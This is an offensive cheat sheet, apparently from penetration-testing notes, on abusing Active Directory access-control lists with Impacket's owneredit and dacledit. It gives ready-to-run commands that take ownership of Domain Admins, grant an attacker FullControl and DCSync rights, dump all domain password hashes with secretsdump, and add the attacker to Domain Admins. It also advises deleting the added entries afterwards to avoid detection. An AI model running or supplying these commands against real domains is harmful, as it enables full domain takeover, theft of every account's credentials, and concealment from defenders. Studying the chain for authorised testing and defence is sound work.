# 07.02 DACL Attacks owneredit.py dacledit.py

> Set object owners (`owneredit.py`) and write individual ACEs (`dacledit.py`) to chain WriteOwner → FullControl → DCSync.

## Overview

owneredit.py sets the owner of an AD object. dacledit.py reads and writes individual ACEs on any AD object. Together they enable WriteOwner → FullControl → DCSync or group membership escalation chains.

## Steps

- owneredit: -action write sets a new owner; -action read reads current owner
- dacledit: -action read shows ACEs; -action write adds an ACE; -action remove removes an ACE
- -rights accepts: FullControl, ResetPassword, WriteMembers, DCSync, GenericWrite, GenericAll
- WriteOwner chain: set owner → grant FullControl → exploit (add member / reset password)
- DCSync chain: dacledit on domain root → add DS-Replication-Get-Changes ACEs → secretsdump
- Always remove added ACEs after exploitation to avoid detection

## Commands

### owneredit — take ownership

```bash
# Read current owner
impacket-owneredit DOMAIN/attacker:'P@ss' -action read -target victimuser -dc-ip DC_IP
# Set new owner
impacket-owneredit DOMAIN/attacker:'P@ss' -action write -new-owner attacker -target victimuser -dc-ip DC_IP
impacket-owneredit DOMAIN/attacker:'P@ss' -action write -new-owner attacker -target-dn 'CN=Domain Admins,CN=Users,DC=domain,DC=local' -dc-ip DC_IP
```

### dacledit — read ACEs on object

```bash
impacket-dacledit DOMAIN/user:'P@ss' -action read -target victimuser -dc-ip DC_IP
impacket-dacledit DOMAIN/user:'P@ss' -action read -target 'CN=Domain Admins,CN=Users,DC=domain,DC=local' -dc-ip DC_IP
impacket-dacledit DOMAIN/user:'P@ss' -action read -principal attacker -target victimuser -dc-ip DC_IP
```

### dacledit — grant rights to self

```bash
impacket-dacledit DOMAIN/attacker:'P@ss' -action write -rights FullControl -principal attacker -target victimuser -dc-ip DC_IP
impacket-dacledit DOMAIN/attacker:'P@ss' -action write -rights ResetPassword -principal attacker -target victimuser -dc-ip DC_IP
impacket-dacledit DOMAIN/attacker:'P@ss' -action write -rights WriteMembers -principal attacker -target 'CN=Domain Admins,CN=Users,DC=domain,DC=local' -dc-ip DC_IP
```

### dacledit — grant DCSync rights

```bash
impacket-dacledit DOMAIN/attacker:'P@ss' -action write -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' -dc-ip DC_IP
# Then DCSync:
impacket-secretsdump DOMAIN/attacker:'P@ss'@DC_IP -just-dc
```

### WriteOwner full exploitation chain

```bash
# 1. Take ownership of Domain Admins group
impacket-owneredit DOMAIN/attacker:'P@ss' -action write -new-owner attacker -target-dn 'CN=Domain Admins,CN=Users,DC=domain,DC=local' -dc-ip DC_IP
# 2. Grant self FullControl
impacket-dacledit DOMAIN/attacker:'P@ss' -action write -rights FullControl -principal attacker -target-dn 'CN=Domain Admins,CN=Users,DC=domain,DC=local' -dc-ip DC_IP
# 3. Add self to group
net rpc group addmem "Domain Admins" attacker -U DOMAIN/attacker%'P@ss' -S DC_IP
```

### dacledit — cleanup (remove ACE)

```bash
impacket-dacledit DOMAIN/attacker:'P@ss' -action remove -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' -dc-ip DC_IP
```
